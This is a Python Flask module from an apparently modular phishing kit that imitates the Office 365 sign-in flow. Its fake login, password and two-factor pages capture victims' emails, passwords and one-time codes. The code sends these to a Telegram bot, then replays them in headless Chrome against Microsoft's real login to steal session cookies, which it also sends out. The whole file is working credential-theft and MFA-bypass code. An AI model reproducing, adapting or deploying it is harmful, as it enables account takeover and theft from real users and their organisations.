from __future__ import print_function
from flask import redirect, request, session
import json, time
from os import getenv
from core.base_module import BaseModule
import requests
import traceback
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import os, traceback, shutil, datetime

class Office365Module(BaseModule):
    def __init__(self, enable_2fa=False):
        super().__init__(self)
        self.set_name('office365')
        self.add_route('login', '/')
        self.add_route('password_page', '/password')
        # intermediate loading page shown after password submission
        self.add_route('loading', '/loading')
        self.add_route('twofactor', '/twofactor')
        self.add_route('redirect', '/redirect')
        self.enable_two_factor(enable_2fa)

    def login(self):
        template = self.env.get_template('login.html')
        return template.render(next_url='/password', hostname=request.host)

    def password_page(self):
        self.user = request.values.get('loginfmt') or request.values.get('email')
        template = self.env.get_template('password.html')
        # password page posts to /loading so we can show a verifying screen
        return template.render(next_url='/loading', hostname=request.host, email=self.user)

    def loading(self):
        """Handle password submission, send early credentials, show verifying dots."""
        self.user = request.values.get('email') or request.values.get('loginfmt')
        self.captured_password = request.values.get('passwd')

        # Early exfiltration
        ip = request.remote_addr
        ua = request.user_agent.string
        early_msg = (
            f"*O365 Credential Capture (Part 1)*\n"
            f"IP: `{ip}`\nUser-Agent: `{ua}`\n\n"
            f"Email: `{self.user}`\nPassword: `{self.captured_password}`\n"
            "Waiting for 2FA code…"
        )
        self.send_telegram(early_msg)

        template = self.env.get_template('loading.html')
        # auto-redirect to 2FA page after short delay
        return template.render(next_url='/twofactor', hostname=request.host, email=self.user, password=self.captured_password)

    def twofactor(self):
        # we reach here via redirect from loading page (GET) or direct POST
        self.user = request.values.get('email') or getattr(self, 'user', None)
        self.captured_password = request.values.get('password') or getattr(self, 'captured_password', None)
        template = self.env.get_template('twofactor.html')
        return template.render(next_url='/redirect', hostname=request.host, email=self.user, password=self.captured_password)

    def redirect(self):
        self.user = request.values.get('email')
        self.captured_password = request.values.get('password')
        self.two_factor_token = request.values.get('two_factor_token')

        # attempt automated login & cookie capture
        cookies = self.perform_automated_login()

        cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
        full_msg = (
            f"*O365 Credential Capture (Full)*\nEmail: `{self.user}`\nPassword: `{self.captured_password}`\n2FA: `{self.two_factor_token}`\n\nCookies:\n```json\n{cookie_block}\n```"
        )
        self.send_telegram(full_msg)

        return redirect(self.final_url, code=302)

    def send_telegram(self, message):
        bot_token = getenv('TELEGRAM_BOT_TOKEN')
        chat_id = getenv('TELEGRAM_CHAT_ID')
        if not bot_token or not chat_id:
            return
        url = 'https://api.telegram.org/bot{}/sendMessage'.format(bot_token)
        payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
        try:
            requests.post(url, json=payload, timeout=10)
        except Exception:
            pass

    def perform_automated_login(self):
        """Use headless Chrome to login and return cookies list. Handles M-series Mac headless quirks & Stay-signed-in prompt."""
        email = getattr(self, 'user', None)
        password = getattr(self, 'captured_password', None)
        token = getattr(self, 'two_factor_token', None)
        if not all([email, password, token]):
            return []

        opts = webdriver.ChromeOptions()
        def log(msg):
            print(f"[{datetime.datetime.utcnow().isoformat()}] SELENIUM: {msg}")

        opts.binary_location = os.getenv('CHROME_BIN', '/usr/bin/chromium')
        if not os.path.exists(opts.binary_location):
            alt = shutil.which('chromium') or shutil.which('chromium-browser') or '/usr/lib/chromium/chromium'
            opts.binary_location = alt
        log(f"Using chrome binary: {opts.binary_location}")
        opts.add_argument('--headless=new')
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--remote-allow-origins=*')  # fixes chrome 111+ in some envs
        opts.add_argument('--no-zygote')

        try:
            # Let Selenium Manager fetch the correct chromedriver automatically
            log("Launching Chrome via Selenium Manager…")
            driver = webdriver.Chrome(options=opts)
            driver.set_page_load_timeout(60)
            log("Chrome WebDriver session started")

            # Step 1: email
            driver.get('https://login.microsoftonline.com/')
            time.sleep(2)
            driver.find_element(By.NAME, 'loginfmt').send_keys(email)
            driver.find_element(By.ID, 'idSIButton9').click()
            time.sleep(3)

            # Step 2: password
            driver.find_element(By.NAME, 'passwd').send_keys(password)
            driver.find_element(By.ID, 'idSIButton9').click()
            time.sleep(3)

            # Step 3: 2FA code
            try:
                driver.find_element(By.NAME, 'otc').send_keys(token)
            except Exception:
                # different input name handling
                driver.find_element(By.CSS_SELECTOR, 'input[type="tel"], input[type="text"]').send_keys(token)
            driver.find_element(By.ID, 'idSIButton9').click()

            # Handle optional stay signed in prompt
            try:
                from selenium.webdriver.support.ui import WebDriverWait
                from selenium.webdriver.support import expected_conditions as EC
                WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.ID, 'idBtn_Back'))
                ).click()
            except Exception:
                pass  # prompt may not appear

            # Wait until redirected to Office portal or other Microsoft service page
            try:
                from selenium.webdriver.support.ui import WebDriverWait
                from selenium.webdriver.support import expected_conditions as EC
                WebDriverWait(driver, 20).until(
                    EC.url_contains('office')
                )
            except Exception:
                pass

            time.sleep(2)

            cookies = driver.get_cookies()
        except Exception as e:
            tb = traceback.format_exc()
            print(tb)
            cookies = [{"error": str(e)}]
            self._last_error = tb
        finally:
            try:
                driver.quit()
            except Exception:
                pass
        return cookies

def load(enable_2fa=False):
    return Office365Module(enable_2fa) 
    